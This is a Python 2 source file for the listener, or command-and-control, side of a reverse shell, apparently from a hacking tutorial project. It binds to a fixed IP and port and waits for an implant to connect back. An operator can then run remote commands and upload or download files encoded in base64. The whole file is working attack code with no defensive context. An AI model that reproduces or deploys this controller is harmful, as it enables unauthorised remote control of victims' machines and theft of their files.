#  Copyright (c) 2019. Ciphyr
#  Email: ciphyr[at]protonmail.com
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  You may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#  http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

import socket, json, base64, shlex

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)

        print('[+] Waiting for incoming connection')
        self.connection, address = listener.accept()
        print('[+] Connection Acquired From: ' + str(address))

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def json_receive(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Download Successful.'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input('>> ')
            command = shlex.split(command)
            try:
                if command[0] == 'upload':
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.remote_execute(command)
                if command[0] == 'download' and 'Error' not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = '[-] Error during command execution'


            print(result)

    def remote_execute(self, command):
        self.json_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        return self.json_receive()

my_listener = Listener('192.168.100.242', 8080)
my_listener.run()